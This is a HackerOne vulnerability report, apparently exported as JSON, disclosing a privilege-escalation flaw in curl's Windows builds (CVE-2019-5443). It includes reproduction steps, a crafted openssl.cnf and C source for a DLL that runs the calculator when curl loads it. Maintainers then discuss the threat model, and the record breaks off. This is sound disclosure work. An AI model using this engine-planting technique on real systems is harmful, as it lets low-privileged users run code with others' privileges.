{"id":608577,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MDg1Nzc=","url":"https://hackerone.com/reports/608577","title":"Windows Privilege Escalation: Malicious OpenSSL Engine","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-06-12T02:21:14.871Z","submitted_at":"2019-06-12T02:21:14.871Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mirchr","url":"/mirchr","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":35663,"url":"https://hackerone.com/curl","handle":"curl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"curl","twitter_handle":"","website":"https://curl.se","about":"cURL is a computer software project providing a library and command-line tool for transferring data using various protocols."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-5443"],"singular_disclosure_disabled":false,"disclosed_at":"2019-06-29T18:24:27.107Z","bug_reporter_agreed_on_going_public_at":"2019-06-29T01:48:01.914Z","team_member_agreed_on_going_public_at":"2019-06-29T18:24:27.021Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nThe curl windows binaries are built with OpenSSL libraries and have an insecure path for the OPENSSLDIR build parameter. This path is set to c:\\usr\\local\\ssl. When curl is executed it attempts to load openssl.cnf from this path. By default on windows, low privileged users have the authority to create folders under c:\\. A low privileged user can create a custom openssl.cnf file to load a malicious OpenSSL Engine(library). The result is arbitrary code execution with the full authority of the account executing the curl binary.\n\n\nVersion tested.\ncurl-7.65.1_1-win64\n\nOS:\nWindows 10 \n\n## Steps To Reproduce:\nAll steps are executed as a low privileged(non-admin) user unless otherwise noted\n\n 1. As a low privileged user create the following folder c:\\usr\\local\\ssl\n```\nmkdir c:\\usr\nmkdir c:\\usr\\local\nmkdir c:\\usr\\local\\ssl\n```\n\n 2. Create an openssl.cnf file with the following contents.\n\n```\nopenssl_conf = openssl_init\n[openssl_init]\nengines = engine_section\n[engine_section]\nwoot = woot_section\n[woot_section]\nengine_id = woot\ndynamic_path = c:\\\\stage\\\\calc.dll\ninit = 0\n```\n\n 3. Create the c:\\stage folder\n```\nmkdir c:\\stage\n````\n\n 4. Create and compile a malicious OpenSSL Engine library. For this PoC we will execute the Windows calculator.\n````\n/* Cross Compile with\n   x86_64-w64-mingw32-g++ calc.c -o calc.dll -shared\n*/\n#include \u003cwindows.h\u003e\nBOOL WINAPI DllMain(\n    HINSTANCE hinstDLL,\n    DWORD fdwReason,\n    LPVOID lpReserved )\n{\n    switch( fdwReason )\n    {\n        case DLL_PROCESS_ATTACH:\n            system(\"calc\");\n            break;\n        case DLL_THREAD_ATTACH:\n         // Do thread-specific initialization.\n            break;\n        case DLL_THREAD_DETACH:\n         // Do thread-specific cleanup.\n            break;\n        case DLL_PROCESS_DETACH:\n         // Perform any necessary cleanup.\n            break;\n    }\n    return TRUE;  // Successful DLL_PROCESS_ATTACH.\n}\n```\n\n 5. Copy calc.dll to c:\\stage\n`\ncopy calc.dll c:\\stage\n`\n 6. Execute curl.exe as a different user.\n\n## Supporting Material/References:\n  * PoC image showing curl loading a custom calc.dll and executing calc.exe\n{F507228}\n\n## Impact\n\nA malicious local user(or potentially malware) with access to a Windows workstation or server with curl installed has the ability to silently plant a custom OpenSSL Engine library that contains arbitrary code. Every time curl is executed this library will be loaded and the code executed with the full authority of the account executing it resulting in the elevation of privileges.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eThe curl windows binaries are built with OpenSSL libraries and have an insecure path for the OPENSSLDIR build parameter. This path is set to c:\\usr\\local\\ssl. When curl is executed it attempts to load openssl.cnf from this path. By default on windows, low privileged users have the authority to create folders under c:. A low privileged user can create a custom openssl.cnf file to load a malicious OpenSSL Engine(library). The result is arbitrary code execution with the full authority of the account executing the curl binary.\u003c/p\u003e\n\n\u003cp\u003eVersion tested.\u003cbr\u003e\ncurl-7.65.1_1-win64\u003c/p\u003e\n\n\u003cp\u003eOS:\u003cbr\u003e\nWindows 10 \u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eAll steps are executed as a low privileged(non-admin) user unless otherwise noted\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eAs a low privileged user create the following folder c:\\usr\\local\\ssl\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emkdir c:\\usr\nmkdir c:\\usr\\local\nmkdir c:\\usr\\local\\ssl\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eCreate an openssl.cnf file with the following contents.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eopenssl_conf = openssl_init\n[openssl_init]\nengines = engine_section\n[engine_section]\nwoot = woot_section\n[woot_section]\nengine_id = woot\ndynamic_path = c:\\\\stage\\\\calc.dll\ninit = 0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eCreate the c:\\stage folder\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emkdir c:\\stage\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCreate and compile a malicious OpenSSL Engine library. For this PoC we will execute the Windows calculator.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/* Cross Compile with\nx86_64-w64-mingw32-g++ calc.c -o calc.dll -shared\n*/\n#include \u0026lt;windows.h\u0026gt;\nBOOL WINAPI DllMain(\nHINSTANCE hinstDLL,\nDWORD fdwReason,\nLPVOID lpReserved )\n{\nswitch( fdwReason )\n{\n    case DLL_PROCESS_ATTACH:\n        system(\u0026quot;calc\u0026quot;);\n        break;\n    case DLL_THREAD_ATTACH:\n     // Do thread-specific initialization.\n        break;\n    case DLL_THREAD_DETACH:\n     // Do thread-specific cleanup.\n        break;\n    case DLL_PROCESS_DETACH:\n     // Perform any necessary cleanup.\n        break;\n}\nreturn TRUE;  // Successful DLL_PROCESS_ATTACH.\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eCopy calc.dll to c:\\stage\u003cbr\u003e\n\u003ccode\u003e\u003cbr\u003e\ncopy calc.dll c:\\stage\u003cbr\u003e\n\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eExecute curl.exe as a different user.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003ePoC image showing curl loading a custom calc.dll and executing calc.exe\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"curl-exec-calc\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/507/228/3a7d58c063c39d14e8003c25e3e2d6c00b8affe0/curl-exec-calc?response-content-disposition=attachment%3B%20filename%3D%22curl-exec-calc%22%3B%20filename%2A%3DUTF-8%27%27curl-exec-calc\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063008Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026amp;X-Amz-Signature=d6f402d5edc548d56d0d66ca4fc24a0150aca486c3193562d9e9ee316e014b13\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/507/228/3a7d58c063c39d14e8003c25e3e2d6c00b8affe0/curl-exec-calc?response-content-disposition=attachment%3B%20filename%3D%22curl-exec-calc%22%3B%20filename%2A%3DUTF-8%27%27curl-exec-calc\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063008Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026amp;X-Amz-Signature=d6f402d5edc548d56d0d66ca4fc24a0150aca486c3193562d9e9ee316e014b13\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eA malicious local user(or potentially malware) with access to a Windows workstation or server with curl installed has the ability to silently plant a custom OpenSSL Engine library that contains arbitrary code. Every time curl is executed this library will be loaded and the code executed with the full authority of the account executing it resulting in the elevation of privileges.\u003c/p\u003e\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":507228,"file_name":"curl-exec-calc","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/507/228/3a7d58c063c39d14e8003c25e3e2d6c00b8affe0/curl-exec-calc?response-content-disposition=attachment%3B%20filename%3D%22curl-exec-calc%22%3B%20filename%2A%3DUTF-8%27%27curl-exec-calc\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063008Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=d6f402d5edc548d56d0d66ca4fc24a0150aca486c3193562d9e9ee316e014b13","file_size":645880,"type":"image/png"}],"allow_singular_disclosure_at":"2019-07-29T01:48:01.991Z","allow_singular_disclosure_after":-44858526.27075254,"singular_disclosure_allowed":true,"vote_count":23,"voters":["is-","dhakal_ananda","mygf","exception","cr4xerbik4sh","l00p3r","onetrick","tems","cryptographer","clarckowen_","and 13 more..."],"severity":{"rating":"high","score":7.8,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":18844,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/curl/curl","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5061121,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The recommended way to resolve this issue is to ensure the OPENSSLDIR path is set to a location that is only writable by the system. I suggest using the paths documented at https://github.com/openssl/openssl/blob/master/NOTES.WIN#L63-L77. This would ensure that a low privileged user cannot tamper with the OpenSSL configuration.","markdown_message":"\u003cp\u003eThe recommended way to resolve this issue is to ensure the OPENSSLDIR path is set to a location that is only writable by the system. I suggest using the paths documented at \u003ca title=\"https://github.com/openssl/openssl/blob/master/NOTES.WIN#L63-L77\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fopenssl%2Fopenssl%2Fblob%2Fmaster%2FNOTES.WIN%23L63-L77\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/openssl/openssl/blob/master/NOTES.WIN#L63-L77\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. This would ensure that a low privileged user cannot tamper with the OpenSSL configuration.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T02:25:45.539Z","updated_at":"2019-06-12T02:25:45.539Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5061884,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your report. We will investigate!","markdown_message":"\u003cp\u003eThanks for your report. We will investigate!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T05:42:48.866Z","updated_at":"2019-06-12T05:42:48.866Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5062043,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Question: if a malicious user or malware can create directories and put arbitrary files in them with chosen content, isn't the user screwed already? If we would \"fix\" curl as suggested (that would limit from which paths it would attempt to load openssl \"engines\"), surely the malicious user could then instead simply opt to put a curl replacement in that local directory and execute that then instead of the one we provide?","markdown_message":"\u003cp\u003eQuestion: if a malicious user or malware can create directories and put arbitrary files in them with chosen content, isn\u0026#39;t the user screwed already? If we would \u0026quot;fix\u0026quot; curl as suggested (that would limit from which paths it would attempt to load openssl \u0026quot;engines\u0026quot;), surely the malicious user could then instead simply opt to put a curl replacement in that local directory and execute that then instead of the one we provide?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T06:45:20.737Z","updated_at":"2019-06-12T06:45:20.737Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5062057,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay, an obvious difference is that using @mirchr's approach, it can trick the \"regular\" curl  executable to run code that wasn't intended. Still, the malicious user can already execute that code at will...","markdown_message":"\u003cp\u003eOkay, an obvious difference is that using \u003ca href=\"/mirchr\"\u003e@mirchr\u003c/a\u003e\u0026#39;s approach, it can trick the \u0026quot;regular\u0026quot; curl  executable to run code that wasn\u0026#39;t intended. Still, the malicious user can already execute that code at will...\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T06:51:28.455Z","updated_at":"2019-06-12T06:51:28.455Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5064158,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bagder Great question and thank you for the prompt response. A low privileged user by nature should be limited and not have the ability to influence another users execution flow. This vulnerability exists regardless of the location from where curl is executed.\n\nIf a malicious user copied curl to a different location as you described, the calling user/script/job/etc... would also need to updated to use the new location which is not a practical attack. This is not the scenario that I am referring to. \n\nThere are a few reasonable deployment scenarios but the most concerning one is where a large organization distributes the curl binary to many workstations or servers. In this scenario curl would be installed to a common location and write access to the curl binary would be limited to administrators. No part of this path could be altered by the low privileged user. With the current design to protect users from this vulnerability, the administrator would also need to create the c:\\etc folder and limit write access.\n\nBecause this is leveraging native functionality built into the application, endpoint protection solutions will not flag this activity as malicious.\n\nLet me know if you have any further questions.","markdown_message":"\u003cp\u003e\u003ca href=\"/bagder\"\u003e@bagder\u003c/a\u003e Great question and thank you for the prompt response. A low privileged user by nature should be limited and not have the ability to influence another users execution flow. This vulnerability exists regardless of the location from where curl is executed.\u003c/p\u003e\n\n\u003cp\u003eIf a malicious user copied curl to a different location as you described, the calling user/script/job/etc... would also need to updated to use the new location which is not a practical attack. This is not the scenario that I am referring to. \u003c/p\u003e\n\n\u003cp\u003eThere are a few reasonable deployment scenarios but the most concerning one is where a large organization distributes the curl binary to many workstations or servers. In this scenario curl would be installed to a common location and write access to the curl binary would be limited to administrators. No part of this path could be altered by the low privileged user. With the current design to protect users from this vulnerability, the administrator would also need to create the c:\\etc folder and limit write access.\u003c/p\u003e\n\n\u003cp\u003eBecause this is leveraging native functionality built into the application, endpoint protection solutions will not flag this activity as malicious.\u003c/p\u003e\n\n\u003cp\u003eLet me know if you have any further questions.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T09:57:03.688Z","updated_at":"2019-06-12T09:57:03.688Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5064274,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mirchr thanks for the explanation. My understanding of your report is that a non-tainted curl can be tricked into running malicious code pointed to by the OPENSSLDIR environment variable. Is there a way for the low privileged user to influence this environment variable for other users, or just for himself/herself? Or is this a case where the low privileged user can trick curl into running code the he/she could run as well without curl at all, but not trick any other users invocation of curl on the system?\n\nIf my interpretation is correct then the angle seems to be that a low-privileged user can trick a curl embedded into a larger application to run malicious code (since for running just curl, he/she could just run the malicious code directly?)","markdown_message":"\u003cp\u003e\u003ca href=\"/mirchr\"\u003e@mirchr\u003c/a\u003e thanks for the explanation. My understanding of your report is that a non-tainted curl can be tricked into running malicious code pointed to by the OPENSSLDIR environment variable. Is there a way for the low privileged user to influence this environment variable for other users, or just for himself/herself? Or is this a case where the low privileged user can trick curl into running code the he/she could run as well without curl at all, but not trick any other users invocation of curl on the system?\u003c/p\u003e\n\n\u003cp\u003eIf my interpretation is correct then the angle seems to be that a low-privileged user can trick a curl embedded into a larger application to run malicious code (since for running just curl, he/she could just run the malicious code directly?)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T10:28:23.535Z","updated_at":"2019-06-12T10:28:23.535Z","actor":{"username":"dgustafsson","cleared":false,"url":"/dgustafsson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5064668,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dgustafsson OPENSSLDIR is not an environment variable. OPENSSLDIR is a compile time parameter so it's built directly into the binary and the location where it points to is writable by low privileged users. The curl binary will attempt to load the openssl.cnf file from this path on each invocation. A low privileged user can stage a malicious library(OpenSSL Engine) that will be loaded and executed every time curl is executed by any user on the system. The malicious code will execute with the full authority of the user executing the binary.\n\nHere is an example scenario to illustrate what is happening here\n\n* User A is a low privileged account\n* Admin B is an admin account\n\n1) UserA creates the malicious openssl.cnf and OpenSSL Engine library in c:\\usr\\local\\ssl\n\n2) AdminB executes a batch job which calls the curl binary. The location of the curl binary does not matter but for this scenario the curl binary is in a protected location that is only writable by admin users. During startup and unknowingly to AdminB, the curl binary reads c:\\usr\\local\\ssl\\openssl.cnf and then loads the malicious library(DLL) into memory. The malicious library is coded to execute arbitrary code when loaded. This code is executed with the full privileges of the AdminB user.\n","markdown_message":"\u003cp\u003e\u003ca href=\"/dgustafsson\"\u003e@dgustafsson\u003c/a\u003e OPENSSLDIR is not an environment variable. OPENSSLDIR is a compile time parameter so it\u0026#39;s built directly into the binary and the location where it points to is writable by low privileged users. The curl binary will attempt to load the openssl.cnf file from this path on each invocation. A low privileged user can stage a malicious library(OpenSSL Engine) that will be loaded and executed every time curl is executed by any user on the system. The malicious code will execute with the full authority of the user executing the binary.\u003c/p\u003e\n\n\u003cp\u003eHere is an example scenario to illustrate what is happening here\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eUser A is a low privileged account\u003c/li\u003e\n\u003cli\u003eAdmin B is an admin account\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e1) UserA creates the malicious openssl.cnf and OpenSSL Engine library in c:\\usr\\local\\ssl\u003c/p\u003e\n\n\u003cp\u003e2) AdminB executes a batch job which calls the curl binary. The location of the curl binary does not matter but for this scenario the curl binary is in a protected location that is only writable by admin users. During startup and unknowingly to AdminB, the curl binary reads c:\\usr\\local\\ssl\\openssl.cnf and then loads the malicious library(DLL) into memory. The malicious library is coded to execute arbitrary code when loaded. This code is executed with the full privileges of the AdminB user.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T10:58:40.295Z","updated_at":"2019-06-12T10:58:40.295Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5064731,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-12T11:16:23.795Z","updated_at":"2019-06-12T11:16:23.795Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f